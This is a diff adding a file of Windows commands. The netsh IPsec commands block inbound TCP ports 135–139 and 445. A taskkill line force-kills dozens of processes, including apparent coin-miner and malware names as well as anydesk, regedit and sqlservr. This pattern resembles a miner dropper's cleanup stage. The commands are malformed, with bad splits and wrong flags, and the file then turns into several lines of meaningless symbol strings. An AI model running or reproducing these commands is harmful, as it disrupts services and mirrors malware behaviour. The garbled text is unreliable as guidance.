@@ -1,0 +1,36 @@
+
+protocol=tcp mirrored=yes dstport=135
+
+netsh ipsec static add filter filterlist=denylist srcaddr=any dstaddr=me description=not
+
+protocol=tcp mirrored=yes dstport=137
+
+netsh ipsec static add filter filterlist=denylist srcaddr=any dstaddr=me description=not protocol=tcp mirrored=yes dstport=138
+
+netsh ipsec static add filter filterlist=denylist srcaddr=any dstaddr=me description=not protocol=tcp mirrored=yes dstport=139
+
+netsh ipsec static add filter filterlist=denylist srcaddr=any dstaddr=me description=not protocol=tcp mirrored=yes dstport=445
+
+netsh ipsec static add filteraction name=Allow action=permit
+
+netsh ipsec static add filteraction name=deny action=block
+
+netsh ipsec static add rule name=deny1 policy win filterlist=denylist filteraction=deny netsh ipsec static set policy name=win assign=y
+
+
+taskkill /f /m help.exe /m doc001.exe /m dhelllllper.exe /m DOC001.exe /m dhelper.exe /m conime.exe /m a.exe /m docv8.exe /m king.exe /m name.exe /m doc.exe /m wodCmdTerm.exe/m winlogins.exe /m winlogins.exe /m lsaus.exe /m lsars.exe /m lsacs.exe /m regedit.exe /m 1smsm.exe /m v5.exe /m anydesk.exe /m sqler.exe /m sqlservr.exe /m NsCpuCNMiner64.exe /m NsCpuCNMiner32.exe /m tlscntr.exe /meter.exe /m 1smo.exe /m 1sarr.exe /m convert.exe /m WinSCV.exe /m ctfmonc.exe /m 1smose.exe /m svhost.exe /m secscan.exe/mwuauser.exe /m splwow64.exe /m boy.exe /m powered.EXE /m systems.exe /m acnom.exe /m regdrv.exe/m mscsuscr.exe /m Pviunc.exe /m Bllianc.exe /m st.exe /m nvidia_update.exe /m dether.exe /m
+
+buff2.exe /m a.exe /m lacas.exe
+
+
+{£~}-<S>-{VPN}¥{i¡~¡!}(%)-($C++{€}¥)>{=}<₩÷₩+×+<[^]>{?!÷¡¿}-<@>-{¥}|\//\|
+
+{£~}-<S>-{VPN}¥{i¡~¡!}(%)~€₩÷₩+×+<[^]>{?!÷¡¿}-<@>-{¥}|\/*_*/\|
+
+ßp=õ%=!??ịn∞+×+ņəẅ:ðãþæ≠《`~∞ßŝƴ§þ÷?[¥}={?¿?#=@=#¿?¿}》k"++l{£~}-<S>-{≠VPN≈}¥{i¡~¡i}×{cqq]=[$C++]{€}¥z>{∞}<₩÷₩+×+<[^]>{?!÷¡¿}-<@>-{¥}|\/*_*/\|》₩+÷×÷+₩cqq≈:]'!#1/2łóòƙịṅğ≠±№≡I į§=']:{》√°\_/◇&○π¿¢?}¥{=4°□}+ñē×,÷þ×ō=(=+₩+₩+₩+={ĎŇŠ}~{ÐŅŚ}=ṄĖẄ×=Ď.Ð.ÑƏ×:+N.nŇ.Ņ.Ñ++Ŝ§Śs.≈VPN≈ïṣ≡{{DNS4}×¥∞Ω}℅+©+¢}=°‰=?cqq¿c++}}++=[×√π]
+
+
+ßp=õ%=!??ịn∞+×+ņəẅ:ðãþæ≠《`~∞ßŝƴ§þ÷?[¥}={?¿?#=@=#¿?¿}》k"++l{£~}〔-<S>-〕{₹VPN≈}¥{i¡~¡i}×{cqq]=[$C++]{€}¥z>{∞}<₩÷₩+×+<[^]>{?!÷¡¿}〔-<@>-〕{¥}|\/*_*/\|》₩+÷×÷+₩cqq≈:]'!#1/2łóòƙịṅğ≠±№≡I į§=']:{》√°\_/◇&○π¿¢?}¥{=4°□}+ñē×,÷þ×ō=€=+₩+₩+₩+={ĎŇŠ}~{ÐŅŚ}=ṄĖẄ×=Ď.Ð.ÑƏ×:+N.nŇ.Ņ.Ñ++Ŝ§Śs.≈VPN≈ïṣ≡{{DNS4}×¥∞Ω}℅+©+¢}=°‰=?cqq¿c++}}++=[×√π]
+∞<@>@þ!=/?=【∞】
+ {?-<S>–<@>-?=$>,#+,÷×+〔【@】【<ŕ"÷"〔#÷}∞{>^<*₹}=₩₩₩=〕:)["!/÷+=+,÷×/÷=?>,!)=@/÷=?>,!)≈Ṭ÷),÷/?:
+
